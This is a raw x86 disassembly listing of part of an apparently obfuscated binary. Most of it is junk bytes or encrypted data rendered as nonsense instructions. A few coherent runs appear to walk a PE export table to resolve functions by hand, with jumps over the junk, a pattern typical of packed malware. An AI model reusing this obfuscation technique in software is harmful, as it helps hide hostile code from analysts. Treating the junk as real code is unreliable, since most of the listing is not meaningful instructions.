  40ec94:	shl    al,cl
  40ec96:	cli    
  40ec97:	jnp    0x40ec5d
  40ec99:	inc    esp
  40ec9a:	test   DWORD PTR [edx-0x66627dbc],0xb6518828
  40eca4:	jae    0x40ecd5
  40eca6:	sub    al,bh
  40eca8:	mov    ch,0xd2
  40ecaa:	or     DWORD PTR [ebp+ebp*4-0x3],0xffffffa2
  40ecaf:	loop   0x40ed02
  40ecb1:	jecxz  0x40ecd4
  40ecb3:	or     al,0x38
  40ecb5:	data16 jecxz 0x40ecdb
  40ecb8:	mov    dh,0xdc
  40ecba:	pop    ebx
  40ecbb:	jmp    0x40ec60
  40ecbd:	and    ebx,DWORD PTR [ebp-0x74fc8218]
  40ecc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ecc4:	pop    eax
  40ecc5:	fstp   TBYTE PTR [edx+0x33]
  40ecc8:	out    dx,eax
  40ecc9:	jb     0x40ec75
  40eccb:	pop    esi
  40eccc:	fidiv  WORD PTR [ebp-0x1]
  40eccf:	cmp    eax,DWORD PTR [edi]
  40ecd1:	jb     0x40ec5d
  40ecd3:	ret    0x7d08
  40ecd6:	pop    ebx
  40ecd7:	jle    0x40ecd9
  40ecd9:	cld    
  40ecda:	call   0x83d50e32
  40ecdf:	jl     0x40ed01
  40ece1:	dec    ebx
  40ece2:	arpl   WORD PTR [edx+0x54],sp
  40ece5:	mov    DWORD PTR [ebp-0x14],eax
  40ece8:	mov    eax,DWORD PTR [ebp-0x4]
  40eceb:	mov    ecx,DWORD PTR [ebp-0x14]
  40ecee:	xor    eax,esi
  40ecf0:	add    eax,ebx
  40ecf2:	cmp    ecx,eax
  40ecf4:	je     0x40fd3a
  40ecfa:	mov    eax,DWORD PTR [ebp-0x14]
  40ecfd:	mov    eax,DWORD PTR [eax+0x18]
  40ed00:	mov    DWORD PTR [ebp-0x20],eax
  40ed03:	mov    eax,DWORD PTR [ebp-0x14]
  40ed06:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed09:	add    ecx,DWORD PTR [eax+0x20]
  40ed0c:	mov    DWORD PTR [ebp-0x28],ecx
  40ed0f:	mov    eax,DWORD PTR [ebp-0x14]
  40ed12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ed15:	jmp    0x40f109
  40ed1a:	loopne 0x40ece4
  40ed1c:	or     ebx,DWORD PTR [edx]
  40ed1e:	xor    esp,ecx
  40ed20:	in     eax,dx
  40ed21:	ror    BYTE PTR [esi],cl
  40ed23:	cmp    DWORD PTR [ebx-0x5732a289],eax
  40ed29:	jmp    0x70b19332
  40ed2e:	dec    ecx
  40ed2f:	jge    0x40eda1
  40ed31:	jo     0x40ecde
  40ed33:	out    0x2f,al
  40ed35:	ret    0x3c01
  40ed38:	cli    
  40ed39:	loop   0x40ed64
  40ed3b:	xor    DWORD PTR [edi+0x5a],eax
  40ed3e:	cmp    al,0xd5
  40ed40:	dec    esi
  40ed41:	xlat   BYTE PTR ds:[ebx]
  40ed42:	inc    ebx
  40ed43:	pop    ss
  40ed44:	fisub  DWORD PTR [eax-0x80]
  40ed47:	gs cld 
  40ed49:	add    eax,0xf642608a
  40ed4e:	push   ebx
  40ed4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed50:	out    0x86,eax
  40ed52:	test   al,0x9f
  40ed54:	mov    edx,0x60f9736a
  40ed59:	mov    ebp,0x9b921d0f
  40ed5e:	jle    0x40ed96
  40ed60:	cld    
  40ed61:	inc    ebx
  40ed62:	iret   
  40ed63:	fwait
  40ed64:	sub    dh,cl
  40ed66:	dec    edi
  40ed67:	mov    eax,0x26faf7c7
  40ed6c:	or     al,0x4a
  40ed6e:	dec    ecx
  40ed6f:	xchg   ebp,eax
  40ed70:	int3   
  40ed71:	mov    ds:0xd95e5ed2,eax
  40ed76:	jge    0x40edcb
  40ed78:	in     al,dx
  40ed79:	neg    BYTE PTR ds:0x1db506dd
  40ed7f:	repnz ficom DWORD PTR [ecx+0x4cec2256]
  40ed86:	mov    dh,0xd6
  40ed88:	fnstcw WORD PTR [esp+eax*8-0x35]
  40ed8c:	mov    bl,0x61
  40ed8e:	sysret 
  40ed90:	sub    bh,BYTE PTR [eax]
  40ed92:	mov    ebp,0xbe4e8b17
  40ed97:	jge    0x40ed59
  40ed99:	fild   QWORD PTR [esi-0x22691aef]
  40ed9f:	imul   edi,DWORD PTR [ebx+0x469e2d40],0x30b0bb11
  40eda9:	fistp  QWORD PTR [ecx+eiz*8]
  40edac:	inc    esi
  40edad:	shr    DWORD PTR [ebx+0x10f504f2],1
  40edb3:	bound  eax,QWORD PTR gs:[ebx-0x5e]
  40edb7:	cwde   
  40edb8:	push   ss
  40edb9:	ficom  WORD PTR [ecx+0x59]
  40edbc:	xchg   edi,eax
  40edbd:	jp     0x40ee20
  40edbf:	adc    dh,0xcf
  40edc2:	je     0x40edd5
  40edc4:	push   es
  40edc5:	setbe  BYTE PTR [edx+0x5b]
  40edc9:	sar    DWORD PTR [eax-0x2a],0x79
  40edcd:	rol    DWORD PTR [ecx],1
  40edcf:	sar    BYTE PTR [ebx+0x42],cl
  40edd2:	das    
  40edd3:	repz mov dh,0x81
  40edd6:	retf   
  40edd7:	adc    al,0xd9
  40edd9:	ret    
  40edda:	jge    0x40ed8a
  40eddc:	js     0x40ee4e
  40edde:	xchg   DWORD PTR [ebx+esi*4],ebx
  40ede1:	xor    al,BYTE PTR [esi-0x1a573dbd]
  40ede7:	or     BYTE PTR [ecx-0x38],0x42
  40edeb:	and    eax,0xd470112f
  40edf0:	lods   al,BYTE PTR ds:[esi]
  40edf1:	sbb    dh,BYTE PTR [esi]
  40edf3:	mov    DWORD PTR [ecx],edx
  40edf5:	xchg   esp,eax
  40edf6:	repz mov edx,0x2399ba52
  40edfc:	dec    esi
  40edfd:	xor    eax,0xcd56d03b
  40ee02:	add    al,0x96
  40ee04:	mov    esi,DWORD PTR [esi+0x4159175]
  40ee0a:	and    esp,eax
  40ee0c:	xor    ah,0x50
  40ee0f:	fs int 0xd1
  40ee12:	push   eax
  40ee13:	jns    0x40ee5f
  40ee15:	sti    
  40ee16:	fadd   DWORD PTR [ebp+0x69]
  40ee19:	cmp    eax,0x32156831
  40ee1e:	dec    ebp
  40ee1f:	pop    ecx
  40ee20:	arpl   WORD PTR ds:0xa35c59ec,cx
  40ee26:	in     al,dx
  40ee27:	mov    cl,0xff
  40ee29:	pop    eax
  40ee2a:	dec    ebx
  40ee2b:	xor    DWORD PTR [ebx],ecx
  40ee2d:	xchg   esi,eax
  40ee2e:	out    0xdb,al
  40ee30:	adc    DWORD PTR [ecx+0x12],esp
  40ee33:	test   BYTE PTR [edx+0x3b3e1394],dl
  40ee39:	mov    ah,0x26
  40ee3b:	xchg   edi,eax
  40ee3c:	mov    ecx,ebx
  40ee3e:	sub    DWORD PTR [eax+0x7c6a7487],eax
  40ee44:	imul   ebp,DWORD PTR [esi+0x67],0x3ad4523c
  40ee4b:	into   
  40ee4c:	xor    al,0xb
  40ee4e:	aam    0x78
  40ee50:	xchg   esi,eax
  40ee51:	and    bl,BYTE PTR [eax]
  40ee53:	cdq    
  40ee54:	into   
  40ee55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee56:	nop
  40ee57:	loop   0x40eeb7
  40ee59:	ret    0x628d
  40ee5c:	(bad)  
  40ee5d:	dec    esp
  40ee5e:	pop    ds
  40ee5f:	fdivp  st(5),st
  40ee61:	pop    edx
  40ee62:	fsubr  st(4),st
  40ee64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee65:	dec    esp
  40ee66:	hlt    
  40ee67:	mov    al,0x31
  40ee69:	cmp    bl,BYTE PTR [edx+0x20]
  40ee6c:	fwait
  40ee6d:	cmp    dh,ch
  40ee6f:	hlt    
  40ee70:	ss mov ebp,0xd551bf4d
  40ee76:	jecxz  0x40eeb8
  40ee78:	jo     0x40ee12
  40ee7a:	(bad)  
  40ee7c:	xchg   esp,eax
  40ee7d:	add    ecx,0xffffffe6
  40ee80:	push   ds
  40ee81:	(bad)  
  40ee82:	sub    esp,DWORD PTR [esi-0x3a817647]
  40ee88:	js     0x40ee8d
  40ee8a:	adc    BYTE PTR [eax+0x50],cl
  40ee8d:	ficomp DWORD PTR [edx+0x31]
  40ee90:	cmp    BYTE PTR [eax+0x2e],bh
  40ee93:	clc    
  40ee94:	xor    al,0xe
  40ee96:	(bad)  
  40ee97:	stos   DWORD PTR es:[edi],eax
  40ee98:	jecxz  0x40ee90
  40ee9a:	xlat   BYTE PTR ds:[ebx]
  40ee9b:	jg     0x40ee3e
  40ee9d:	xor    BYTE PTR [eax-0x25978037],0xa3
  40eea4:	shl    DWORD PTR [ecx],1
  40eea6:	cli    
  40eea7:	jmp    0x40ef23
  40eea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eeaa:	jno    0x40ee9c
  40eeac:	xor    BYTE PTR [edi],0x85
  40eeaf:	push   ecx
  40eeb0:	mov    dl,0xab
  40eeb2:	sbb    al,BYTE PTR [ecx]
  40eeb4:	fmul   st,st(2)
  40eeb6:	adc    eax,0x8387103f
  40eebb:	and    al,0xb8
  40eebd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eebe:	inc    edx
  40eebf:	gs addr16 jnp 0x40ef41
  40eec3:	or     eax,0x564afbea
  40eec8:	call   0xc67b:0x8292ed83
  40eecf:	je     0x40eec1
  40eed1:	out    dx,eax
  40eed2:	test   BYTE PTR [ebp+0x3b],cl
  40eed5:	adc    edi,DWORD PTR [eax+0x51096da4]
  40eedb:	sub    al,0x9b
  40eedd:	push   ds
  40eede:	test   BYTE PTR [ebx+0x14fcf2a1],bh
  40eee4:	adc    BYTE PTR fs:[ecx+0x30],dh
  40eee8:	scas   al,BYTE PTR es:[edi]
  40eee9:	or     DWORD PTR [edi],esp
  40eeeb:	cmp    dh,0x69
  40eeee:	gs aad 0xe5
  40eef1:	ss push ss
  40eef3:	mov    ch,0x82
  40eef5:	out    0x72,al
  40eef7:	cmp    DWORD PTR [edx-0x4c],edx
  40eefa:	jnp    0x40eecb
  40eefc:	push   esi
  40eefd:	jmp    DWORD PTR ds:0x237ace8
  40ef03:	push   ss
  40ef04:	xchg   edi,eax
  40ef05:	not    ch
  40ef07:	imul   eax,edi,0x4fa30a93
  40ef0d:	jmp    0x4fad:0x137347ce
  40ef14:	add    BYTE PTR [ebx-0x52],al
  40ef17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ef18:	into   
  40ef19:	add    al,0x4f
  40ef1b:	fucom  st(0)
  40ef1d:	adc    DWORD PTR [edx+0x39],edi
  40ef20:	ror    DWORD PTR [edx+0x4dfbb8b],cl
  40ef26:	nop
  40ef27:	loope  0x40eeeb
  40ef29:	test   DWORD PTR [ecx-0x2b8b412f],esi
  40ef2f:	inc    edx
  40ef30:	shr    DWORD PTR [eax+0x17],cl
  40ef33:	sub    ch,BYTE PTR [esi]
  40ef35:	inc    esi
  40ef36:	stc    
  40ef37:	pop    eax
  40ef38:	adc    ch,bl
  40ef3a:	add    BYTE PTR [edx+0x3e91adb0],bl
  40ef40:	retf   
  40ef41:	int    0x9d
  40ef43:	scas   eax,DWORD PTR es:[edi]
  40ef44:	jbe    0x40ef94
  40ef46:	in     al,dx
  40ef47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ef48:	fwait
  40ef49:	jecxz  0x40ef6b
  40ef4b:	outs   dx,DWORD PTR ds:[esi]
  40ef4c:	add    al,0x85
  40ef4e:	push   cs
  40ef4f:	xor    DWORD PTR [edi-0x20],esi
  40ef52:	lods   al,BYTE PTR ds:[esi]
  40ef53:	cld    
  40ef54:	or     al,0xd4
  40ef56:	adc    DWORD PTR [ecx],ecx
  40ef58:	inc    ebp
  40ef59:	out    dx,eax
  40ef5a:	add    DWORD PTR [ebx-0x517b02c6],eax
  40ef60:	call   0xb219f908
  40ef65:	in     eax,0xcd
  40ef67:	add    al,0xb0
  40ef69:	xor    edi,DWORD PTR ds:0x7e1ed5cb
  40ef6f:	mov    al,0x2a
  40ef71:	neg    DWORD PTR [edi]
  40ef73:	pop    es
  40ef74:	xor    esp,DWORD PTR [esi]
  40ef76:	push   0xffffffa7
  40ef78:	xor    bx,WORD PTR [edx+esi*4+0x35]
  40ef7d:	jb     0x40ef71
  40ef7f:	mov    dl,0x75
  40ef81:	push   esp
  40ef82:	add    al,0xeb
  40ef84:	and    eax,0x8bb3077b
  40ef89:	cmp    DWORD PTR [edi-0x58f0c330],0xa2599c25
  40ef93:	pop    ecx
  40ef94:	dec    ebx
  40ef95:	cmp    eax,0x3aa92cb9
  40ef9a:	hlt    
  40ef9b:	jmp    0x49d224af
  40efa0:	icebp  
  40efa1:	pop    ebp
  40efa2:	inc    edi
  40efa3:	inc    edi
  40efa4:	data16 and al,dl
  40efa7:	sub    eax,edi
  40efa9:	scas   eax,DWORD PTR es:[edi]
  40efaa:	aas    
  40efab:	cmp    dl,BYTE PTR [eax+0x3f]
  40efae:	mov    dh,0x24
  40efb0:	mov    WORD PTR [eax-0x24aeccd8],es
  40efb6:	jae    0x40ef8a
  40efb8:	fs push 0xf4c82b0d
  40efbe:	or     dh,BYTE PTR [eax-0x56]
  40efc1:	add    BYTE PTR [eax-0x3f726791],0xe5
  40efc8:	inc    ebp
  40efc9:	push   ebx
  40efca:	retf   0xe8ad
  40efcd:	sbb    al,0x1a
  40efcf:	jb     0x40efc7
  40efd1:	aaa    
  40efd2:	cmp    al,0x34
  40efd4:	sbb    BYTE PTR [edx-0x35493ad8],0xf
  40efdb:	jnp    0x40efc9
  40efdd:	jmp    0x97e8bc81
  40efe2:	add    DWORD PTR [edi],edi
  40efe4:	jo     0x40efe9
  40efe6:	dec    esi
  40efe7:	pop    edi
  40efe8:	int    0xa2
  40efea:	shl    edx,cl
  40efec:	adc    DWORD PTR [ecx-0x150c8ac6],esp
  40eff2:	int    0xe1
  40eff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eff5:	and    BYTE PTR [edi+edx*8],al
  40eff8:	mov    dh,0xa8
  40effa:	or     DWORD PTR [esi],edx
  40effc:	scas   eax,DWORD PTR es:[edi]
  40effd:	mov    WORD PTR [eax-0x67],es
  40f000:	retf   
  40f001:	push   cs
  40f002:	push   edx
  40f003:	out    0xfb,eax
  40f005:	rol    DWORD PTR [edi+esi*2+0x3c],1
  40f009:	(bad)  
  40f00a:	fcom   st(7)
  40f00c:	mov    al,ds:0xf993fbea
  40f011:	add    esp,DWORD PTR [ebp+0x53ce82a4]
  40f017:	inc    esp
  40f018:	outs   dx,BYTE PTR ds:[esi]
  40f019:	das    
  40f01a:	(bad)  
  40f01b:	push   esp
  40f01c:	jbe    0x40f067
  40f01e:	mov    cl,0x3f
  40f020:	aad    0x35
  40f022:	add    eax,0xe6ccb6b9
  40f027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f028:	imul   edx,DWORD PTR [esi+0x72942d79],0x6a24346c
  40f032:	ret    
  40f033:	inc    ebp
  40f034:	push   ebx
  40f035:	aaa    
  40f036:	gs dec ecx
  40f038:	pop    DWORD PTR [eax+edi*1+0x57]
  40f03c:	mov    cl,0x9b
  40f03e:	imul   ebp,DWORD PTR [ebp+eax*8-0x5b],0xffffff8f
  40f043:	or     eax,0xed3c6458
  40f048:	dec    ebx
  40f049:	push   0xffffffaa
  40f04b:	sub    al,0xf
  40f04d:	xchg   ebx,eax
  40f04e:	pop    es
  40f04f:	std    
  40f050:	mov    al,ds:0x96489119
  40f055:	add    dl,BYTE PTR [esi-0x347d498f]
  40f05b:	push   ebx
  40f05c:	push   DWORD PTR [ebp-0x7b]
  40f05f:	or     eax,0x5f4d873a
  40f064:	jl     0x40f0da
  40f066:	or     DWORD PTR [eax+0x6],0x96ccf33
  40f06d:	inc    ecx
  40f06e:	or     al,BYTE PTR [edi-0x29]
  40f071:	push   ebp
  40f072:	les    esp,FWORD PTR [edi-0x2e96e3ad]
  40f078:	fwait
  40f079:	mov    al,0x79
  40f07b:	jmp    0xa529:0x8d79f6af
  40f082:	aaa    
  40f083:	stc    
  40f084:	ret    0x68b0
  40f087:	loop   0x40f0bc
  40f089:	sub    al,0xe9
  40f08b:	pop    eax
  40f08c:	fstp   TBYTE PTR [ecx]
  40f08e:	test   al,0xc6
  40f091:	mov    ?,WORD PTR [ebx-0x7e59ca9f]
  40f097:	out    0x90,al
  40f099:	clc    
  40f09a:	pop    ecx
  40f09b:	jmp    0x40f0c0
  40f09d:	jb     0x40f116
  40f09f:	and    ch,BYTE PTR [ebp+0x6978056e]
  40f0a5:	imul   edx,DWORD PTR [ebp+edi*1-0x1e],0xffffffa9
  40f0aa:	data16 jp 0x40f0a6
  40f0ad:	mov    bl,0x9b
  40f0af:	push   edx
  40f0b0:	inc    edi
  40f0b1:	gs cld 
  40f0b3:	pop    ebp
  40f0b4:	movlhps xmm3,xmm7
  40f0b7:	add    al,dl
  40f0b9:	mov    edi,fs
  40f0bb:	inc    esi
  40f0bc:	aam    0x77
  40f0be:	sub    ebx,DWORD PTR [edx]
  40f0c0:	sub    eax,0x3a3b0ceb
  40f0c5:	pop    edi
  40f0c6:	adc    eax,0xbc61d997
  40f0cb:	xor    BYTE PTR [edi],cl
  40f0cd:	and    DWORD PTR [eax+0x55573a2b],0xffffff81
  40f0d4:	dec    eax
  40f0d5:	div    DWORD PTR [edx+eax*8]
  40f0d8:	aas    
  40f0d9:	dec    edx
  40f0da:	in     al,dx
  40f0db:	or     DWORD PTR [eax+0x9],0xda2154e3
  40f0e2:	out    dx,eax
  40f0e3:	push   edi
  40f0e4:	(bad)  
  40f0e5:	sub    ch,BYTE PTR [edi+eax*1]
  40f0e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0e9:	lock pop ss
  40f0eb:	inc    esp
  40f0ec:	cmp    al,0x3f
  40f0ee:	stos   DWORD PTR es:[edi],eax
  40f0ef:	push   ecx
  40f0f0:	or     edi,eax
  40f0f2:	mov    dh,0x95
  40f0f4:	push   ss
  40f0f5:	pop    ss
  40f0f6:	and    eax,0x51367a1c
  40f0fb:	loop   0x40f0a7
  40f0fd:	ror    DWORD PTR [ecx],0x1f
  40f100:	jmp    0x40f125
  40f102:	jmp    0x4244:0xb38c26dd
  40f109:	add    ecx,DWORD PTR [eax+0x24]
  40f10c:	mov    DWORD PTR [ebp-0x2c],ecx
  40f10f:	mov    eax,DWORD PTR [ebp-0x14]
  40f112:	mov    ecx,DWORD PTR [ebp+0x8]
  40f115:	add    ecx,DWORD PTR [eax+0x1c]
  40f118:	jmp    0x40f50c
  40f11d:	inc    ecx
  40f11e:	jae    0x40f19a
  40f120:	pop    ebp
  40f121:	sub    dh,BYTE PTR [ebp+0x61]
  40f124:	jae    0x40f173
  40f126:	and    ebp,DWORD PTR [eax]
  40f128:	mov    bh,0x33
  40f12a:	cmp    esp,edi
  40f12c:	aaa    
  40f12d:	pop    ebp
  40f12e:	mov    ds:0x7d497070,eax
  40f133:	jo     0x40f1a5
  40f135:	push   ebx
  40f136:	shr    BYTE PTR [edx+0x49],1
  40f139:	iret   
  40f13a:	mov    dh,0x4a
  40f13c:	add    eax,0x8db36c09
  40f141:	retf   
  40f142:	push   cs
  40f143:	inc    esi
  40f144:	jae    0x40f147
  40f146:	or     BYTE PTR [esi-0x7b],bl
  40f149:	sar    BYTE PTR [edi-0x5e804807],cl
  40f14f:	and    ecx,edi
  40f151:	and    ch,BYTE PTR [ebp+0x38]
  40f154:	mov    eax,0x66d239b
  40f159:	shr    DWORD PTR [edi],0x49
  40f15c:	pop    es
  40f15d:	and    ch,BYTE PTR [ecx+0x28]
  40f160:	cdq    
  40f161:	xchg   esi,eax
  40f162:	jo     0x40f17d
  40f164:	dec    esi
  40f165:	add    eax,0x937d53ab
  40f16a:	xor    al,0x7b
  40f16c:	stc    
  40f16d:	sahf   
  40f16e:	cs pop edx
  40f170:	loope  0x40f10e
  40f172:	jmp    ebx
  40f174:	pop    edx
  40f175:	xchg   ebp,eax
  40f176:	pop    ss
  40f177:	in     al,dx
  40f178:	inc    esp
  40f179:	pop    eax
  40f17a:	fidiv  WORD PTR [edx]
  40f17c:	das    
  40f17d:	jb     0x40f1ec
  40f17f:	pushf  
  40f180:	iret   
  40f181:	xchg   ebx,eax
  40f182:	push   ebp
  40f183:	jp     0x40f1a5
  40f185:	dec    esi
  40f186:	loopne 0x40f152
  40f188:	mov    DWORD PTR ds:0xd259a0b6,ecx
  40f18e:	mov    eax,ds:0x41a4a355
  40f193:	repz push es
  40f195:	jecxz  0x40f1ed
  40f197:	pop    edx
  40f198:	(bad)  
  40f199:	xlat   BYTE PTR ds:[ebx]
  40f19a:	or     DWORD PTR [ecx+0x4a607936],ecx
  40f1a0:	add    eax,0x6fe000e2
  40f1a5:	xchg   esi,eax
  40f1a6:	fwait
  40f1a7:	or     ecx,DWORD PTR [ebx]
  40f1a9:	out    0xe9,al
  40f1ab:	mov    edi,0x84b81e23
  40f1b0:	adc    DWORD PTR [eax],eax
  40f1b2:	or     dh,BYTE PTR [bx+si]
  40f1b5:	je     0x40f187
  40f1b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f1b8:	das    
  40f1b9:	sbb    BYTE PTR [ecx-0x48],0x20
  40f1bd:	and    eax,0xe6313525
  40f1c2:	fisttp WORD PTR [esp+ebx*4+0x2ab88261]
  40f1c9:	repz (bad) 
  40f1cb:	test   eax,0xa6fd3d9f
  40f1d0:	cmp    eax,0x5ee70e3
  40f1d5:	add    BYTE PTR [edi+0xe],al
  40f1d8:	cmp    BYTE PTR [edx],dh
  40f1da:	sbb    eax,0x46d726f2
  40f1df:	cmp    ecx,ebx
  40f1e1:	mov    edi,0x1e42ced8
  40f1e6:	dec    ebp
  40f1e7:	cs xor al,0xee
  40f1ea:	inc    eax
  40f1eb:	cmp    eax,0x8ce4a3ce
  40f1f0:	pop    es
  40f1f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f1f2:	add    BYTE PTR [edi],bl
  40f1f4:	and    ebx,DWORD PTR ds:0x303daff
  40f1fa:	cmp    DWORD PTR [eax-0x7e],0x80c15bc3
  40f201:	push   edx
  40f202:	sbb    DWORD PTR [edi+0x187908d5],eax
  40f208:	adc    al,0xa6
  40f20a:	out    dx,al
  40f20b:	pop    esi
  40f20c:	inc    ecx
  40f20d:	arpl   dx,sp
  40f20f:	pop    ds
  40f210:	call   0xce8e:0x30a6591b
  40f217:	icebp  
  40f218:	icebp  
  40f219:	pop    ss
  40f21a:	pop    ebp
  40f21b:	xor    BYTE PTR [edi-0x2934601b],bh
  40f221:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f222:	daa    
  40f223:	push   ebx
  40f224:	add    dl,BYTE PTR [edx-0x5df7e155]
  40f22a:	inc    esp
  40f22b:	mov    cl,0xaf
  40f22d:	mov    bh,0xb9
  40f22f:	sti    
  40f230:	sbb    ah,bl
  40f232:	in     eax,dx
  40f233:	stos   BYTE PTR es:[edi],al
  40f234:	ja     0x40f287
  40f236:	xor    eax,0xe9de1246
  40f23b:	scas   al,BYTE PTR es:[edi]
  40f23c:	mov    bh,0xde
  40f23e:	rol    DWORD PTR [edi-0x7dc01927],0x2f
  40f245:	adc    al,0x66
  40f247:	mov    ch,dl
  40f249:	dec    edx
  40f24a:	xchg   edx,eax
  40f24b:	sub    BYTE PTR [eax+0x7d],cl
  40f24e:	push   esi
  40f24f:	arpl   cx,si
  40f251:	(bad)  
  40f252:	ficom  WORD PTR [esi+ecx*8]
  40f255:	adc    eax,0xa8fa1b7d
  40f25a:	ds clc 
  40f25c:	xlat   BYTE PTR ds:[ebx]
  40f25d:	loopne 0x40f24a
  40f25f:	mov    ah,0x38
  40f261:	sbb    ebx,DWORD PTR [edx-0x354dcc95]
  40f267:	in     al,0x1
  40f269:	xor    eax,0x1b96b278
  40f26e:	mov    esp,0x259681b5
  40f273:	les    ebx,FWORD PTR [ecx+edi*1-0x3b]
  40f277:	add    al,0xdc
  40f279:	or     ecx,ebp
  40f27b:	push   ebx
  40f27d:	bound  edx,QWORD PTR [edi-0x4a]
  40f280:	test   al,0x61
  40f282:	jmp    0x40f300
  40f284:	cmp    eax,0x7e6d3a36
  40f289:	call   0x8f27:0x224fc1e
  40f290:	lods   eax,DWORD PTR ds:[esi]
  40f291:	xor    DWORD PTR [edi],esp
  40f293:	sbb    DWORD PTR [eax],ebp
  40f295:	cmp    al,0x4b
  40f297:	inc    ebp
  40f298:	xchg   edx,eax
  40f299:	xchg   DWORD PTR [edi+0x1d],ecx
  40f29c:	xchg   esp,eax
  40f29d:	pop    esp
  40f29e:	mov    eax,0x77be3dc9
  40f2a3:	aas    
  40f2a4:	or     BYTE PTR [edx],cl
  40f2a6:	and    ebx,DWORD PTR [ecx]
  40f2a8:	fimul  DWORD PTR [ecx]
  40f2aa:	jb     0x40f2aa
  40f2ac:	popf   
  40f2ad:	leave  
  40f2ae:	jge    0x40f24e
  40f2b0:	push   ds
  40f2b1:	xchg   edx,eax
  40f2b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f2b3:	cmc    
  40f2b4:	xchg   edi,eax
  40f2b5:	pop    esi
  40f2b6:	pop    ss
  40f2b7:	cmp    dh,BYTE PTR [ebx-0x7eafcb70]
  40f2bd:	and    eax,0x915595f8
  40f2c2:	xchg   esi,esp
  40f2c4:	xchg   ebx,eax
  40f2c5:	dec    eax
  40f2c6:	aaa    
  40f2c7:	sub    eax,esi
  40f2c9:	sbb    eax,0x2ab4017d
  40f2ce:	jae    0x40f2f5
  40f2d0:	mov    edi,DWORD PTR [ebp+0x65]
  40f2d3:	cwde   
  40f2d4:	lahf   
  40f2d5:	hlt    
  40f2d6:	loop   0x40f2b2
  40f2d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2d9:	cmp    BYTE PTR [ebx+0x27],ah
  40f2dc:	inc    esi
  40f2dd:	pop    ss
  40f2de:	and    eax,0xe24296
  40f2e3:	cmp    DWORD PTR [edi-0x70],ebp
  40f2e6:	in     al,0xcd
  40f2e8:	adc    edx,DWORD PTR [ecx]
  40f2ea:	mov    ch,0xbb
  40f2ec:	cmp    al,0x6
  40f2ee:	sbb    al,0x9e
  40f2f0:	call   0x955c183b
  40f2f5:	sbb    bh,BYTE PTR [esi-0x71]
  40f2f8:	mov    ebp,0x562dd10
  40f2fd:	jmp    0x40b9:0x37fcfcc4
  40f304:	push   es
  40f305:	(bad)  
  40f306:	shl    BYTE PTR [esp+eax*8+0x525e9034],0x4a
  40f30e:	jl     0x40f2a6
  40f310:	dec    esp
  40f311:	ins    DWORD PTR es:[edi],dx
  40f312:	sbb    eax,0x53286e9a
  40f317:	inc    esi
  40f318:	jle    0x40f333
  40f31a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31b:	jb     0x40f324
  40f31d:	xchg   edi,eax
  40f31e:	cmp    esi,DWORD PTR [edx+0x2d]
  40f321:	fcomp  DWORD PTR [ebp-0x57]
  40f324:	mov    al,ds:0xc75044e5
  40f329:	outs   dx,BYTE PTR ds:[esi]
  40f32a:	jge    0x40f321
  40f32c:	xchg   BYTE PTR [esi+0x4c],ch
  40f32f:	mov    edx,0x611c91b2
  40f334:	inc    esi
  40f335:	in     al,0xf9
  40f337:	cmp    eax,0xd8a2614b
  40f33c:	push   ds
  40f33d:	enter  0x95eb,0x54
  40f341:	jecxz  0x40f387
  40f343:	iret   
  40f344:	cmc    
  40f345:	(bad)  
  40f346:	sbb    al,0x71
  40f348:	add    ch,BYTE PTR [esi-0x711ba73]
  40f34e:	push   esp
  40f350:	sahf   
  40f351:	mov    eax,ds:0x46fda28
  40f356:	and    DWORD PTR [edi],edi
  40f358:	js     0x40f345
  40f35a:	xlat   BYTE PTR ds:[ebx]
  40f35b:	imul   WORD PTR fs:[eax+0x7db36aab]
  40f363:	add    BYTE PTR [ebx],0x15
  40f366:	inc    edi
  40f367:	and    al,0x1b
  40f369:	sbb    BYTE PTR [esi+0x4da5cb3d],bl
  40f36f:	jmp    0xa30c:0x4f5126f
  40f376:	in     eax,dx
  40f377:	adc    al,0x23
  40f379:	cli    
  40f37a:	icebp  
  40f37b:	ror    BYTE PTR [esi],cl
  40f37d:	mov    ah,0xdd
  40f37f:	std    
  40f380:	fstp   DWORD PTR [eax-0x8]
  40f383:	sub    ah,BYTE PTR [edi]
  40f385:	outs   dx,DWORD PTR ds:[esi]
  40f386:	pop    ebp
  40f387:	dec    ebx
  40f388:	or     eax,0x51540f75
  40f38d:	pop    esp
  40f38e:	or     al,dh
  40f390:	xlat   BYTE PTR ds:[ebx]
  40f391:	sub    BYTE PTR [eax+0x44],cl
  40f394:	cdq    
  40f395:	or     bh,BYTE PTR [ecx+ebp*8+0x75]
  40f399:	(bad)  
  40f39a:	int    0xaa
  40f39c:	sub    esp,ecx
  40f39e:	ror    DWORD PTR [eax+ebx*2],1
  40f3a1:	cmc    
  40f3a2:	sbb    BYTE PTR [edi],bl
  40f3a4:	pop    edx
  40f3a5:	enter  0x9d32,0xfe
  40f3a9:	cmp    edx,ebx
  40f3ab:	xchg   ebx,eax
  40f3ac:	test   al,0x6a
  40f3ae:	cmp    bh,bh
  40f3b0:	push   esi
  40f3b1:	mov    bh,0xe1
  40f3b3:	daa    
  40f3b4:	jl     0x40f3bf
  40f3b6:	inc    edx
  40f3b7:	or     BYTE PTR [ebx+0x74],dh
  40f3ba:	test   al,0x95
  40f3bc:	pusha  
  40f3bd:	fldcw  WORD PTR [eax+0x7c]
  40f3c0:	inc    eax
  40f3c1:	div    DWORD PTR [ebx+0x6c179f50]
